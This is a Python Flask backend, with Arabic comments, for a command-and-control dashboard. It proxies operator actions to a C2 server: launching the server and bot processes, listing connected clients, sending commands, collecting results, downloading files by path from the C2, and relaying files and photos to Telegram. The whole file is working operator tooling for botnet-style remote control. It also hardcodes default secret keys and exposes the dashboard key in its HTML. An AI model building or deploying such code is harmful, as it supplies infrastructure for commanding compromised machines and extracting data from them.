"""
C2 Dashboard Backend — يعمل على 0.0.0.0:8080 ويوجّه الطلبات إلى C2 على المنفذ 5000.

يدعم اكتشاف العمليات على Linux (pgrep) وWindows (PowerShell + CIM)، وللسيرفر يوجد احتياط
بالتحقق من GET /health عندما لا يُكتشف الملفّ من نظام التشغيل (venv أو اسم مختلف لـ python).
"""
from flask import Flask, request, jsonify, render_template, Response
from flask_cors import CORS
from functools import wraps
import requests
import subprocess
import os
import sys

app = Flask(__name__)
CORS(app)

# ── Configuration ────────────────────────────────────────────────────────
C2_SERVER_URL = os.environ.get("C2_SERVER_URL", "http://localhost:5000")
C2_API_KEY    = os.environ.get("C2_API_KEY",    "c2_super_secret_key_2026_123456")
DASHBOARD_KEY = os.environ.get("DASHBOARD_KEY", "dashboard_secret_2026")
# Python binary used to spawn c2_server / bot sub-processes.
# start_all.sh exports PYTHON_BIN pointing to venv/bin/python.
PYTHON_BIN = os.environ.get(
    "PYTHON_BIN",
    "python" if sys.platform == "win32" else "python3",
)

# Headers forwarded to the C2 server on every proxied request
C2_AUTH = {"X-API-Key": C2_API_KEY, "Content-Type": "application/json"}

# Project root is one level above dashboard/
BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))

# Map process names to the script base-names used for pgrep / pkill
_SCRIPT = {"server": "c2_server.py", "bot": "bot.py"}

# Popen handles for processes started by this dashboard session
_procs: dict = {"server": None, "bot": None}


# ── Script resolution ─────────────────────────────────────────────────────
def _resolve_script(base_name: str) -> str:
    """
    Prefer the clean Linux name (c2_server.py).
    Falls back to the Windows-style 'c2_server (1).py' if present.
    """
    for candidate in (base_name, base_name.replace(".py", " (1).py")):
        path = os.path.join(BASE_DIR, candidate)
        if os.path.exists(path):
            return path
    return os.path.join(BASE_DIR, base_name)  # return even if missing (error reported at start-time)


C2_SERVER_SCRIPT = _resolve_script("c2_server.py")
BOT_SCRIPT       = _resolve_script("bot.py")


# ── Dashboard auth decorator ──────────────────────────────────────────────
def require_auth(f):
    """
    Protect write endpoints with a simple API-key check.
    Browser sends:  X-Dashboard-Key: <DASHBOARD_KEY>
    """
    @wraps(f)
    def decorated(*args, **kwargs):
        key = request.headers.get("X-Dashboard-Key") or request.headers.get("x-dashboard-key")
        if key != DASHBOARD_KEY:
            return jsonify({"error": "Unauthorized — invalid or missing X-Dashboard-Key"}), 401
        return f(*args, **kwargs)
    return decorated


# ── Process helpers ───────────────────────────────────────────────────────
def _subprocess_creation_flags():
    if sys.platform == "win32" and hasattr(subprocess, "CREATE_NO_WINDOW"):
        return subprocess.CREATE_NO_WINDOW
    return 0


def _proc_alive_by_os(script_marker: str) -> bool:
    """
    هل توجد عملية تشغّل هذا السكربت؟
    Linux/macOS/WSL: pgrep -f c2_server.py | bot.py
    Windows: Get-CimInstance Win32_Process (لا يوجد pgrep افتراضياً).
    """
    if sys.platform == "win32":
        try:
            marker = (script_marker or "").strip().replace("'", "")
            if not marker:
                return False
            ps_cmd = (
                "(Get-CimInstance Win32_Process | Where-Object { "
                "$null -ne $_.CommandLine -and "
                f"$_.CommandLine -like '*{marker}*'"
                " }).Count"
            )
            r = subprocess.run(
                ["powershell", "-NoProfile", "-Command", ps_cmd],
                capture_output=True,
                text=True,
                timeout=22,
                creationflags=_subprocess_creation_flags(),
            )
            out = (r.stdout or "").strip()
            return out.isdigit() and int(out) > 0
        except Exception:
            return False
    try:
        r = subprocess.run(
            ["pgrep", "-f", script_marker],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        return r.returncode == 0
    except FileNotFoundError:
        return False


def _c2_http_alive() -> bool:
    """يعمل حتى لو المسلك مختلفاً عن اسم ملفّ السيرفر في cmdline (مثل الإعداد عن بعد أو اسم مختلف للعملية)."""
    try:
        r = requests.get(f"{C2_SERVER_URL}/health", timeout=2)
        return bool(r.ok)
    except Exception:
        return False


def _proc_status(name: str) -> str:
    """
    تشغيل عملية معروفة؟
    1) POpen الذي بدأناه من هذه الدورة من لوحة التحكم.
    2) مطابقة سطر الأمر بالاسم النسبي للسكربت (Linux أو Windows).
    3) للسيرفر فقط: استجابة HTTP على /health.
    """
    p = _procs.get(name)
    if p is not None and p.poll() is None:
        return "running"
    if _proc_alive_by_os(_SCRIPT[name]):
        return "running"
    if name == "server" and _c2_http_alive():
        return "running"
    return "stopped"


# ── C2 proxy helpers ──────────────────────────────────────────────────────
def _proxy_get(path: str):
    try:
        r = requests.get(f"{C2_SERVER_URL}{path}", headers=C2_AUTH, timeout=5)
        return jsonify(r.json()), r.status_code
    except requests.exceptions.ConnectionError:
        return jsonify({"error": "C2 server offline"}), 503
    except Exception as e:
        return jsonify({"error": str(e)}), 500


def _proxy_post(path: str, body=None):
    try:
        payload = body if body is not None else (request.get_json(silent=True) or {})
        r = requests.post(f"{C2_SERVER_URL}{path}", json=payload, headers=C2_AUTH, timeout=5)
        try:
            return jsonify(r.json()), r.status_code
        except Exception:
            return r.text, r.status_code
    except requests.exceptions.ConnectionError:
        return jsonify({"error": "C2 server offline"}), 503
    except Exception as e:
        return jsonify({"error": str(e)}), 500


# ── Frontend ──────────────────────────────────────────────────────────────
@app.route("/")
def index():
    # Inject dashboard key into the HTML so app.js can authenticate API calls
    return render_template("index.html", dashboard_key=DASHBOARD_KEY)


# ── Process management (auth required) ───────────────────────────────────
@app.route("/api/process/<name>/start", methods=["POST"])
@require_auth
def start_process(name: str):
    if name not in ("server", "bot"):
        return jsonify({"error": "Unknown process — use 'server' or 'bot'"}), 400

    if _proc_status(name) == "running":
        return jsonify({"status": "already_running"})

    script = C2_SERVER_SCRIPT if name == "server" else BOT_SCRIPT
    if not os.path.exists(script):
        return jsonify({"error": f"Script not found: {script}"}), 404

    try:
        p = subprocess.Popen(
            [PYTHON_BIN, script],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            cwd=BASE_DIR,
        )
        _procs[name] = p
        return jsonify({"status": "started", "pid": p.pid})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/process/<name>/stop", methods=["POST"])
@require_auth
def stop_process(name: str):
    if name not in ("server", "bot"):
        return jsonify({"error": "Unknown process"}), 400

    script_name = _SCRIPT[name]

    try:
        subprocess.run(
            ["pkill", "-f", script_name],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
    except FileNotFoundError:
        pass  # Windows: لا pgrep/pkill

    if sys.platform == "win32":
        try:
            marker = script_name.replace("'", "")
            ps_cmd = (
                "Get-CimInstance Win32_Process | Where-Object { "
                "$null -ne $_.CommandLine -and "
                f"$_.CommandLine -like '*{marker}*'"
                " } | ForEach-Object { "
                "Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }"
            )
            subprocess.run(
                ["powershell", "-NoProfile", "-Command", ps_cmd],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                timeout=30,
                creationflags=_subprocess_creation_flags(),
            )
        except Exception:
            pass

    # Also terminate the tracked Popen handle if still alive
    p = _procs.get(name)
    if p is not None and p.poll() is None:
        try:
            p.terminate()
            p.wait(timeout=3)
        except subprocess.TimeoutExpired:
            p.kill()
        except Exception:
            pass

    _procs[name] = None
    return jsonify({"status": "stopped"})


@app.route("/api/processes/status")
def processes_status():
    return jsonify({
        "server": _proc_status("server"),
        "bot":    _proc_status("bot"),
    })


# ── C2 proxy: read-only endpoints (no auth required) ─────────────────────
@app.route("/api/clients")
def get_clients():
    return _proxy_get("/clients")


@app.route("/api/logs")
def get_logs():
    return _proxy_get("/get")


@app.route("/api/stats")
def get_stats():
    return _proxy_get("/stats")


@app.route("/api/health")
def health():
    return _proxy_get("/health")


@app.route("/api/command_result", methods=["POST"])
def command_result():
    return _proxy_post("/command_result")


@app.route("/api/commands/history")
def commands_history():
    return _proxy_get("/commands/history")


@app.route("/api/export/logs")
def export_logs():
    try:
        r = requests.get(f"{C2_SERVER_URL}/export/logs", headers=C2_AUTH, timeout=15)
        return Response(
            r.content,
            mimetype="text/csv",
            headers={"Content-Disposition": "attachment;filename=c2_logs.csv"},
        )
    except requests.exceptions.ConnectionError:
        return jsonify({"error": "C2 server offline"}), 503
    except Exception as e:
        return jsonify({"error": str(e)}), 500


# ── C2 proxy: write endpoints (auth required) ─────────────────────────────
@app.route("/api/command", methods=["POST"])
@require_auth
def send_command():
    # Proxies to POST /command on the C2 server
    return _proxy_post("/command")


@app.route("/api/clear", methods=["DELETE"])
@require_auth
def clear_logs():
    try:
        r = requests.delete(f"{C2_SERVER_URL}/clear", headers=C2_AUTH, timeout=5)
        return jsonify(r.json()), r.status_code
    except requests.exceptions.ConnectionError:
        return jsonify({"error": "C2 server offline"}), 503
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/telegram/config", methods=["GET"])
def telegram_get_config():
    return _proxy_get("/telegram_config")


@app.route("/api/telegram/config", methods=["DELETE"])
@require_auth
def telegram_delete_config():
    try:
        r = requests.delete(
            f"{C2_SERVER_URL}/telegram_config",
            headers=C2_AUTH, timeout=5,
        )
        return jsonify(r.json()), r.status_code
    except requests.exceptions.ConnectionError:
        return jsonify({"error": "C2 server offline"}), 503
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/telegram/send", methods=["POST"])
@require_auth
def telegram_send():
    return _proxy_post("/send_to_telegram")


@app.route("/api/telegram/settings", methods=["POST"])
@require_auth
def update_telegram_settings():
    return _proxy_post("/update_telegram_settings")


@app.route("/api/telegram/send_photo", methods=["POST"])
@require_auth
def telegram_send_photo():
    try:
        if 'photo' not in request.files:
            return jsonify({"error": "No photo provided"}), 400
        f               = request.files['photo']
        target_chat_id  = request.form.get('target_chat_id', '')
        headers         = {"X-API-Key": C2_API_KEY}
        data_fields     = {}
        if target_chat_id:
            data_fields['target_chat_id'] = target_chat_id
        r = requests.post(
            f"{C2_SERVER_URL}/send_photo_to_telegram",
            files={"photo": (f.filename, f.read(), f.content_type or "image/jpeg")},
            data=data_fields,
            headers=headers,
            timeout=30,
        )
        return jsonify(r.json()), r.status_code
    except requests.exceptions.ConnectionError:
        return jsonify({"error": "C2 server offline"}), 503
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/telegram/send_file", methods=["POST"])
@require_auth
def telegram_send_file():
    try:
        if 'file' not in request.files:
            return jsonify({"error": "No file provided"}), 400
        f               = request.files['file']
        target_chat_id  = request.form.get('target_chat_id', '')
        headers         = {"X-API-Key": C2_API_KEY}
        data_fields     = {}
        if target_chat_id:
            data_fields['target_chat_id'] = target_chat_id
        r = requests.post(
            f"{C2_SERVER_URL}/send_file_to_telegram",
            files={"file": (f.filename, f.read(), f.content_type or "application/octet-stream")},
            data=data_fields,
            headers=headers,
            timeout=30,
        )
        return jsonify(r.json()), r.status_code
    except requests.exceptions.ConnectionError:
        return jsonify({"error": "C2 server offline"}), 503
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/server_info", methods=["GET"])
def get_server_info():
    return _proxy_get("/server_info")


@app.route("/api/download_file", methods=["GET"])
@require_auth
def download_file():
    """Proxy file download — streams bytes straight from C2 to browser."""
    path = request.args.get("path", "")
    if not path:
        return jsonify({"error": "path required"}), 400
    try:
        r = requests.get(
            f"{C2_SERVER_URL}/download_file",
            params={"path": path},
            headers=C2_AUTH,
            stream=True,
            timeout=30,
        )
        if not r.ok:
            return jsonify(r.json()), r.status_code

        from flask import Response as FlaskResponse
        filename = r.headers.get("Content-Disposition", "").split("filename=")[-1].strip('"') or "file"
        content_type = r.headers.get("Content-Type", "application/octet-stream")
        return FlaskResponse(
            r.iter_content(chunk_size=8192),
            status=r.status_code,
            content_type=content_type,
            headers={"Content-Disposition": f'attachment; filename="{filename}"'},
        )
    except requests.exceptions.ConnectionError:
        return jsonify({"error": "C2 server offline"}), 503
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/server_config", methods=["GET"])
def get_server_config():
    return _proxy_get("/server_config")


@app.route("/api/server_config", methods=["POST"])
@require_auth
def update_server_config():
    return _proxy_post("/server_config")


@app.route("/api/server_config", methods=["DELETE"])
@require_auth
def delete_server_config():
    try:
        r = requests.delete(
            f"{C2_SERVER_URL}/server_config",
            headers=C2_AUTH, timeout=5,
        )
        return jsonify(r.json()), r.status_code
    except requests.exceptions.ConnectionError:
        return jsonify({"error": "C2 server offline"}), 503
    except Exception as e:
        return jsonify({"error": str(e)}), 500


# ── Entry point ──────────────────────────────────────────────────────────
if __name__ == "__main__":
    print(f"\n  C2 Dashboard  →  http://0.0.0.0:8080")
    print(f"  Dashboard key : {DASHBOARD_KEY}")
    print(f"  C2 server     : {C2_SERVER_URL}")
    print(f"  C2 server script : {C2_SERVER_SCRIPT}")
    print(f"  Bot script       : {BOT_SCRIPT}\n")
    app.run(host="0.0.0.0", port=8080, debug=False)
